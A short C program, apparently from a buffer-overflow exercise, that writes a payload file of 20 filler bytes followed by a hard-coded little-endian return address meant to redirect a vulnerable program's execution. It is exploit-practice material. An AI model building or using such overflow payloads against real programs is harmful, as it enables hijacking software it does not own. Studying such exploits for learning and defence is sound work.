#include <stdio.h>

int main() {
    FILE* file;
    file = fopen("text.bin", "wb");

    char trash[] = "asdasdasdasdasdasdas";
    char addr[] = {0xae, 0x51, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00}; // 0x00005555555551ae

    for (unsigned int i = 0; i < 20; i++) {
        fwrite(&trash[i], sizeof(char), 1, file);
    }
    for (unsigned int i = 0; i < 8; i++) {
        fwrite(&addr[i], sizeof(char), 1, file);
    }

    fclose(file);

    return 0;
}
